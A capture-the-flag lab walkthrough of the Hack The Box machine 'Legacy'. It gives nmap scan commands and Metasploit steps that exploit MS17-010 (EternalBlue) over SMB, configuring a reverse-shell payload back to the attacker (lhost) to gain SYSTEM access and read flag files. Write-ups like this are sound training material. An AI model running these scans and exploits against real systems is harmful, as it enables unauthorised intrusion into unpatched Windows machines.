Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.

<br />
Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.10.4 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn
sudo nmap -sU 10.10.10.4 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn
```

<br />
<br />
<br />

The UDP scan didn't return anything useful.

<br />

There are **3 open ports**:
+ **135/tcp**
+ **139/tcp**
+ **445/tcp**

<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.4 -p 135,139,445 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
```

<br />
<br />
<br />

We can see that the services correspond to:
+ **135/tcp Microsoft Windows RPC**
+ **139/tcp Microsoft Windows netbios-ssn**
+ **445/tcp Windows XP microsoft-ds**

<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.4 -p 135,139,445 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```

<br />

This last scan returned a lot of information, but there is a specific critical piece of information, this machine is vulnerable to CVE-2017-0143, also known as EternalBlue.

<br />

------

<br />
### Foothold

The foothold in this machine is very easy and similar to machine Blue, the only thing we need to know is that this machine is **vulnerable to EternalBlue**.

<br />

With this information let's search for a exploit for this vulnerability in **Metasploit**:
```bash
sudo msfdb run
search ms17-010
```

![](/assets/Legacy/4.png)
<br />
<br />
<br />

We can try the first exploit and configure it, as it's the one with the **best rank**:
```Metasploit
use 0
options
set rhosts 10.10.10.4
set lhost tun0
run
```

<br />
<br />
<br />

There is a problem, this exploit is **only compatible with x64 architectures**, so we can try the next exploit:
```Metasploit
search ms17-010
use 10
set rhosts 10.10.10.4
set lhost tun0
run
```

<br />
<br />
<br />

Great!! We have get the foothold as **NT AUTHORITY\SYSTEM**, which is similar to root in Linux systems. Now we only have to print our flags:
```bash
cat C:\\Documents\ and\ Settings\\john\\Desktop\\user.txt
cat C:\\Documents\ and\ Settings\\Administrator\\Desktop\\root.txt
```
